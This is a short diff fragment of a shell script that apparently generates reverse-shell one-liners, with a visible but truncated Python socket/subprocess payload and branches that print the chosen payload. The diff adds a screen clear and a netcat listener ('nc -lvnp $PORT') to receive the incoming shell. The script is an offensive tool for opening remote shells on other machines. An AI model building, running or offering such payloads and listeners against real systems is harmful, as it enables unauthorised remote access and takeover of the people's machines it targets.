@@ -29,6 +29,8 @@ python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,so
 
 #Display of the reverse shell
 
+clear
+
 echo ""
 
 if [ "$reverse" = "rm" ]; then
@@ -46,3 +48,9 @@ fi
 if [ "$reverse" = "python" ]; then
 echo $python
 fi
+
+#Display of the listener (netcat)
+
+echo ""
+
+nc -lvnp $PORT
